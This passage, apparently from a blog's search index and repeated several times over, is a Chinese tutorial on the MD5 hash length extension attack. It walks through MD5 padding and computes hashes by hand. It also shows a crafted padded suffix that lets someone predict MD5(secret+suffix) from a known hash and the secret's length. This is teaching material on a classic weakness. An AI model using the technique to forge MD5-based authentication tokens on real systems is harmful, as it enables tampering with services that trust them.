（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#第二步记录信息长度"},{"categories":["cryptography"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#第三步装入标准的幻数四个整数"},{"categories":["cryptography"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#第四步四轮循环运算"},{"categories":["cryptography"],"content":"举个计算的例子 比如计算字符串test的md5值。 十六进制0x74657374 二进制0b1110100011001010111001101110100 这里与448模512不同余，补位后的数据如下: 十六进制 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 二进制 0b1110100011001010111001101110100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000 将补位后的数据进行一次复杂的运算，计算出 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 数据小于512位，所以将ABCD通过小端规则转换就是MD5值：098f6bcd4621d373cade4e832627b4f6 如果我输入的数据不是test而是一串很长的字符，换算出来大于512小于1024，就需要计算两次，第一次先计算前512位的ABCD的值，算出来后再用这个ABCD去计算后面512位的的ABCD的值，最后算出来的ABCD经过拼接就是这串字符的MD5了 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:3","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#举个计算的例子"},{"categories":["cryptography"],"content":"三、md5的hash扩展攻击 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:0","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#三md5的hash扩展攻击"},{"categories":["cryptography"],"content":"解决的问题 如文章最初遇到的问题，由两个字符串组成一个字符串$str=$a+$b，第一个字符串$a不知道也不可控，只可控第二个字符串$b，同时知道第一个字符串$a的MD5值和长度，这时候将第二个字符串精心构造一下，便可以算出合成的字符串$str的MD5的值 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:1","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#解决的问题"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#攻击原理"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#正常的计算步骤"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#发现问题"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#md5的hash长度扩展攻击操作实例"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#知道的条件"},{"categories":["cryptography"],"content":"攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 md5的hash长度扩展攻击操作实例 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： 